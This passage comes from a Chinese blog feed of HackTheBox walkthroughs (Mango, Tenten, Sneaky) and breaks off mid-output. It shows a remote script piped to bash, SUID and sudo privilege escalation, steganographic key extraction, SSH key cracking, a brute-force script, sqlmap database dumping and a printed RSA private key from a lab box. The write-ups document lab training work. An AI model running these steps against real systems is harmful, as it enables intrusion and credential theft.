<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin@mango:&#x2F;home&#x2F;admin$ curl 10.10.14.42:80&#x2F;LinEnum.sh | bash</span><br><span class="line">&lt;...&gt;</span><br><span class="line">[-] SGID files:</span><br><span class="line">&lt;...&gt;</span><br><span class="line">-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-11-openjdkamd64&#x2F;</span><br><span class="line">bin&#x2F;jjs</span><br></pre></td></tr></table></figure>
<blockquote>
<p>也可以使用命令：<code>find / -user root -perm -4000 2&gt;/dev/null</code></p>
</blockquote>
<p>查看利用方式：<a href="https://gtfobins.github.io/gtfobins/jjs/">https://gtfobins.github.io/gtfobins/jjs/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin@mango:&#x2F;home&#x2F;admin$ jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; var BufferedReader &#x3D; Java.type(&quot;java.io.BufferedReader&quot;);</span><br><span class="line">jjs&gt; var FileReader &#x3D; Java.type(&quot;java.io.FileReader&quot;);</span><br><span class="line">jjs&gt; var br &#x3D; new BufferedReader(new FileReader(&quot;&#x2F;root&#x2F;root.txt&quot;));</span><br><span class="line">jjs&gt; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; print(line); &#125;;</span><br><span class="line">8a8efXXXXXXXXXXXXXXXXXXXXXXXXXb15</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Summary">0x04 Summary</h2>
<p>Mongo是一个主要考察NoSQL注入的的靶机，听这个靶机的名字就感觉数据库用的是MongoDB，为此笔者专门写了一个关于NoSQL注入之MongoDB文章，感兴趣的同学可以去看一看。这次主要考察NoSQL的盲注技巧，其实也没什么技巧，主要还是写脚本的能力吧，感觉还是不太行，需要调试很多次才能pass，但相信先模仿后创造，坚持自己动手写，应该还是没问题的。</p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Tenten Walkthrough</title>
    <url>/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Tenten-Walkthrough">HTB::Tenten Walkthrough</h1>
<h2 id="0x01-Information">0x01 Information</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317230613.png" alt=""></p>
<h2 id="0x02-Tools-and-Tis">0x02 Tools and Tis</h2>
<ul>
<li>nmap</li>
<li>wpscan</li>
<li>JohnTheRipper</li>
<li>steghide</li>
<li>wordpress job-manager plugin</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>nmap扫描靶机端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.10</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)</span><br><span class="line">|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)</span><br><span class="line">|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 4.7.3</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Job Portal &amp;#8211; Just another WordPress site</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 4.8 (92%), Linux 4.9 (91%), Linux 3.12 (90%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   237.00 ms 10.10.16.1</span><br><span class="line">2   309.00 ms 10.10.10.10</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 541.37 seconds</span><br></pre></td></tr></table></figure>
<p>一看80端口运行wordpress站点，不多BB，直接上wpscan工具扫描：</p>
<blockquote>
<p>wpscan使用教程：<a href="https://www.cnblogs.com/Xy--1/p/12236684.html">https://www.cnblogs.com/Xy--1/p/12236684.html</a></p>
</blockquote>
<p>看到这个版本有很多XSS漏洞利用，但是打这个靶机XSS漏洞一般都是没什么作用，接着往下看，发现站点安装了一个<code>job-manager</code>的插件。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318195036.png" alt=""></p>
<p>点击进入申请职位的页面，发现有一个文件上传的地方，先上传一个正常图片，再到<code>http://10.10.10.10/wp-content/%year%/%month%/%filename%</code>查看发现可以正常显示。再尝试用BurpSuite改一下文件内容：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318205438.png" alt=""></p>
<p>服务端检测了后缀名，目前已知只能上传jpg，png等图片类型。</p>
<p><a href="https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/">https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/</a></p>
<p>这篇文章提到了一种类似平行越权的手法：<code>http://10.10.10.10/index.php/jobs/apply/8/</code>，这里8类似招聘文章的id，我们可以使用BurpSuite遍历它：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318203806.png" alt=""></p>
<p>另外，这里扩展一种思路，可以直接写bash脚本跑出来，这种结果更为直观：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq 1 20); <span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$i</span>: &quot;</span>; curl -s http://10.10.10.10/index.php/<span class="built_in">jobs</span>/apply/<span class="variable">$i</span> | grep <span class="string">&#x27;&lt;title&gt;&#x27;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318211616.png" alt=""></p>
<p>id=13的这篇文章标题是<code>HackerAccessGranted</code>，比较可疑，另外id=17的文章标题是我刚刚上传的图片的文件名。这两点结合起来，我们怀疑<code>HackerAccessGranted</code>是不是也是用户上传的一张图片的文件名。但是要访问到这张图片，我们必须知道上传的年份和月份，想到这里，那就写一个Python脚本跑一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">website = <span class="string">&#x27;http://10.10.10.10/wp-content/uploads/&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;HackerAccessGranted&#x27;</span></span><br><span class="line">exts = [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> range(<span class="number">2016</span>, <span class="number">2018</span>):</span><br><span class="line">    <span class="keyword">for</span> month <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">        <span class="keyword">for</span> ext <span class="keyword">in</span> exts:</span><br><span class="line">            url = website + str(year) + <span class="string">&#x27;/&#x27;</span> + <span class="string">&quot;&#123;:02&#125;&quot;</span>.format(month) + <span class="string">&#x27;/&#x27;</span> + filename + <span class="string">&#x27;.&#x27;</span> + ext</span><br><span class="line">            req = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> req.status_code == <span class="number">404</span>:</span><br><span class="line">                url = website</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&#x27;[+] URL Found: &#x27;</span> + url)</span><br></pre></td></tr></table></figure>
<p>得到结果<code>http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg</code></p>
<p>把图片用binwalk检查一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ binwalk HackerAccessGranted.jpg </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br></pre></td></tr></table></figure>
<p>再用隐写工具steghide提取一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ steghide extract -sf HackerAccessGranted.jpg </span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;id_rsa&quot;.</span><br></pre></td></tr></table></figure>
<p>OK，提取出了<code>id_rsa</code>文件，再用John一把梭</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa.hash </span><br><span class="line">$ &#x2F;sbin&#x2F;john id_rsa.hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) 32&#x2F;64])</span><br><span class="line">Cost 1 (KDF&#x2F;cipher [0&#x3D;MD5&#x2F;AES 1&#x3D;MD5&#x2F;3DES 2&#x3D;Bcrypt&#x2F;AES]) is 0 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Note: This format may emit false positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">superpassword    (id_rsa)</span><br><span class="line">Warning: Only 2 candidates left, minimum 4 needed for performance.</span><br><span class="line">1g 0:00:00:08 DONE (2020-03-18 10:52) 0.1173g&#x2F;s 1683Kp&#x2F;s 1683Kc&#x2F;s 1683KC&#x2F;sa6_123..*7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>好了，得到了密码，但是现在好像还没有用户名orz…，再用wpscan枚举站点的用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] takis</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;10.10.10.10&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>再用ssh登录靶机，获取<code>user.txt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh -i id_rsa takis@10.10.10.10</span><br><span class="line">Enter passphrase for key &#39;id_rsa&#39;: </span><br><span class="line">Welcome to Ubuntu 16.04.2 LTS (GNU&#x2F;Linux 4.4.0-62-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">65 packages can be updated.</span><br><span class="line">39 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Fri May  5 23:05:36 2017</span><br><span class="line">takis@tenten:~$ whoami</span><br><span class="line">takis</span><br><span class="line">takis@tenten:~$ ls -la &#x2F;home&#x2F;takis</span><br><span class="line">total 48</span><br><span class="line">drwx------ 5 takis takis 4096 Apr 12  2017 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Apr 12  2017 ..</span><br><span class="line">-rw------- 1 root  root     1 Dec 24  2017 .bash_history</span><br><span class="line">-rw-r--r-- 1 takis takis  220 Apr 12  2017 .bash_logout</span><br><span class="line">-rw-r--r-- 1 takis takis 3771 Apr 12  2017 .bashrc</span><br><span class="line">drwx------ 2 takis takis 4096 Apr 12  2017 .cache</span><br><span class="line">-rw------- 1 root  root   162 Apr 12  2017 .mysql_history</span><br><span class="line">drwxrwxr-x 2 takis takis 4096 Apr 12  2017 .nano</span><br><span class="line">-rw-r--r-- 1 takis takis  655 Apr 12  2017 .profile</span><br><span class="line">drwx------ 2 takis takis 4096 Apr 12  2017 .ssh</span><br><span class="line">-rw-r--r-- 1 takis takis    0 Apr 12  2017 .sudo_as_admin_successful</span><br><span class="line">-r--r--r-- 1 takis takis   33 Apr 12  2017 user.txt</span><br><span class="line">-rw-r--r-- 1 root  root   217 Apr 12  2017 .wget-hsts</span><br></pre></td></tr></table></figure>
<p>提权就很简单了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">takis@tenten:~$ sudo -l</span><br><span class="line">Matching Defaults entries for takis on tenten:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User takis may run the following commands on tenten:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (ALL) NOPASSWD: &#x2F;bin&#x2F;fuckin</span><br><span class="line">takis@tenten:~$ ls -la &#x2F;bin&#x2F;fuckin</span><br><span class="line">-rwxr-xr-x 1 root root 24 Apr 12  2017 &#x2F;bin&#x2F;fuckin</span><br><span class="line">takis@tenten:~$ cat &#x2F;bin&#x2F;fuckin</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">$1 $2 $3 $4</span><br><span class="line">takis@tenten:~$ sudo &#x2F;bin&#x2F;fuckin cat &#x2F;root&#x2F;root.txt</span><br><span class="line">f9f7[------------------]f603</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Summary">0x04 Summary</h2>
<p>Tenten算是一个比较古老的Linux靶机了，就权当开阔知识面，这个靶机的风格和CTF的比赛题很像，通过找wordpress站点的插件漏洞，以及常见的wordpress上传路径来找到隐写<code>id_rsa</code>文件的图片。之后的过程就是比较简单的提权操作了，方法有很多。这个靶机算是比较简单的吧，写了一个小脚本来爆破目录，一天搞定，明天继续。</p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Sneaky Walkthrough</title>
    <url>/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough/</url>
    <content><![CDATA[<blockquote>
<p>不得不说这个靶机的质量非常高，值得一做。（假装安慰一下自己vip没有白充）</p>
</blockquote>
<h1 id="HTB-Sneaky-Walkthrough">HTB::Sneaky Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319101112.png" alt=""></p>
<h3 id="0x02-Prior-knowledge">0x02 Prior knowledge</h3>
<h3 id="IPv6">IPv6</h3>
<p><a href="https://www.w3cschool.cn/ipv6/ipv6_address_types.html">https://www.w3cschool.cn/ipv6/ipv6_address_types.html</a></p>
<p><a href="http://www.what21.com/sys/view/net_ipv6_1536653956137.html">http://www.what21.com/sys/view/net_ipv6_1536653956137.html</a></p>
<p>主要搞清楚IPv6的地址类型和格式，以及本机Mac地址转换成本地唯一地址的计算方法</p>
<h3 id="SNMP">SNMP</h3>
<p><a href="https://www.manageengine.com/network-monitoring/what-is-snmp.html">https://www.manageengine.com/network-monitoring/what-is-snmp.html</a></p>
<p>对于SNMP协议，主要是了解它的管理信息库(MIB，Management Information Base)和对象标识符(OID，Object ID)概念。管理信息库（MIB）是用于管理网络元素的信息的集合， 由对象标识符（OID）标识的管理对象组成了下面这种树状结构：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200321120643.png" alt=""></p>
<h3 id="Buffer-overflow">Buffer overflow</h3>
<h2 id="0x03-Tools-and-Tips">0x03 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>sqlmap</li>
<li>snmpwalk OR snmp-check</li>
<li>gdb</li>
<li>Basic SQL Injection</li>
<li>Enumerating SNMP</li>
<li>Basic buffer overflow exploitation</li>
</ul>
<h2 id="0x04-Pentesting">0x04 Pentesting</h2>
<p>nmap扫描靶机端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.20</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Under Development!</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).</span><br><span class="line">TCP&#x2F;IP fingerprint:</span><br><span class="line">OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;3&#x2F;19%OT&#x3D;80%CT&#x3D;1%CU&#x3D;37304%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5E72D70</span><br><span class="line">OS:C%P&#x3D;i686-pc-windows-windows)SEQ(SP&#x3D;107%GCD&#x3D;1%ISR&#x3D;10D%TI&#x3D;Z%CI&#x3D;I%II&#x3D;I%TS&#x3D;8</span><br><span class="line">OS:)SEQ(CI&#x3D;I%II&#x3D;I)OPS(O1&#x3D;M54BST11NW7%O2&#x3D;M54BST11NW7%O3&#x3D;M54BNNT11NW7%O4&#x3D;M54B</span><br><span class="line">OS:ST11NW7%O5&#x3D;M54BST11NW7%O6&#x3D;M54BST11)WIN(W1&#x3D;7120%W2&#x3D;7120%W3&#x3D;7120%W4&#x3D;7120%W</span><br><span class="line">OS:5&#x3D;7120%W6&#x3D;7120)ECN(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;7210%O&#x3D;M54BNNSNW7%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;Y</span><br><span class="line">OS:%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F</span><br><span class="line">OS:&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%</span><br><span class="line">OS:T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD</span><br><span class="line">OS:&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%RIPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IE</span><br><span class="line">OS:(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 21&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   228.00 ms 10.10.16.1</span><br><span class="line">2   296.00 ms 10.10.10.20</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 523.52 seconds</span><br></pre></td></tr></table></figure>
<p>访问80端口的站点：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319103046.png" alt=""></p>
<p>是一个静态页面，用dirsearch扫描一下站点目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Target: http:&#x2F;&#x2F;10.10.10.20&#x2F;</span><br><span class="line"></span><br><span class="line">[22:26:48] Starting: </span><br><span class="line">[22:26:55] 403 -  289B  - &#x2F;.ht_wsr.txt</span><br><span class="line">[22:26:55] 403 -  282B  - &#x2F;.hta</span><br><span class="line">[22:26:55] 403 -  293B  - &#x2F;.htaccess-local</span><br><span class="line">[22:26:55] 403 -  293B  - &#x2F;.htaccess-marco</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess-dev</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess.BAK</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess.bak1</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess.old</span><br><span class="line">[22:26:55] 403 -  294B  - &#x2F;.htaccess.sample</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess.orig</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess.txt</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess.save</span><br><span class="line">[22:26:55] 403 -  293B  - &#x2F;.htaccess_extra</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess_orig</span><br><span class="line">[22:26:55] 403 -  290B  - &#x2F;.htaccessBAK</span><br><span class="line">[22:26:55] 403 -  290B  - &#x2F;.htaccess_sc</span><br><span class="line">[22:26:55] 403 -  290B  - &#x2F;.htaccessOLD</span><br><span class="line">[22:26:55] 403 -  288B  - &#x2F;.htaccess~</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccessOLD2</span><br><span class="line">[22:26:55] 403 -  286B  - &#x2F;.htgroup</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htpasswd-old</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htpasswd_test</span><br><span class="line">[22:26:55] 403 -  288B  - &#x2F;.htpasswds</span><br><span class="line">[22:26:56] 403 -  286B  - &#x2F;.htusers</span><br><span class="line">[22:28:10] 301 -  307B  - &#x2F;dev  -&gt;  http:&#x2F;&#x2F;10.10.10.20&#x2F;dev&#x2F;</span><br><span class="line">[22:28:10] 200 -  464B  - &#x2F;dev&#x2F;</span><br><span class="line">[22:28:30] 200 -  183B  - &#x2F;index.html</span><br><span class="line">[22:29:14] 403 -  291B  - &#x2F;server-status</span><br><span class="line">[22:29:14] 403 -  292B  - &#x2F;server-status&#x2F;</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<p>发现了一个dev路径，是一个后台登录页面，用万能密码注入试一下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319104954.png" alt=""></p>
<p>成功登录：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319105024.png" alt=""></p>
<p>有一个admin用户，还有一个SSH key，但是没有端口登录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5</span><br><span class="line">Lc4V+rY81lS4cWUx&#x2F;EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr</span><br><span class="line">3mi0MyfiGRh&#x2F;Xr4L0+SwYdylkuX72E7rLkkigSt4s&#x2F;zXp5dJmL2RBZDJf1Qh6Ugb</span><br><span class="line">yDxG2ER49&#x2F;wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn</span><br><span class="line">cb+zfPcTvcP0t63kdEreQbdASYK6&#x2F;e7Iih&#x2F;5eBy3i8YoNJd6Wr8&#x2F;qVtmB+FuxcFj</span><br><span class="line">oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa</span><br><span class="line">Nyp&#x2F;9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR</span><br><span class="line">h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G&#x2F;8U&#x2F;lcx1tiWfUNkLdC</span><br><span class="line">CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX&#x2F;cUcblPDdOmxvazpnP4PW1rEpW8cT</span><br><span class="line">OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a</span><br><span class="line">I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB</span><br><span class="line">JkQxeUkCgYEA3RBR&#x2F;0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz</span><br><span class="line">5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY</span><br><span class="line">ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt&#x2F;MmoSaASbqpwhPSUCgYEA2uym</span><br><span class="line">+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu</span><br><span class="line">7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC</span><br><span class="line">GR4wYcZF0iH&#x2F;t4tn02qqOPaRGJAB3BD&#x2F;B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne</span><br><span class="line">aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q&#x2F;tv7E3kT195MuS10J</span><br><span class="line">VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x</span><br><span class="line">hxNWWZcUFcRuxp5ogcvBdQKBgQDB&#x2F;AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd</span><br><span class="line">1&#x2F;iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi&#x2F;93oJa1on&#x2F;QJlvbv4GO9y3LZ</span><br><span class="line">LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG</span><br><span class="line">UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k&#x2F;</span><br><span class="line">Hu+up36u92YlaT7Yk+fsk&#x2F;k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31</span><br><span class="line">rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>用BurpSuite把请求数据包保存成<code>sneaky.req</code>文件，再用sqlmap跑一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 --dbs</span><br><span class="line">...</span><br><span class="line">[00:33:32] [INFO] fetching database names</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] dev</span><br><span class="line">[*] information_schema             </span><br><span class="line">[*] mysql                </span><br><span class="line">[*] performance_schema</span><br><span class="line"></span><br><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; --tables</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; -T &#39;users&#39; --columns</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; -T &#39;users&#39; -C &#39;name, pass&#39; --dump</span><br><span class="line">[00:38:48] [INFO] fetching entries of column(s) &#39;&#96;name&#96;, 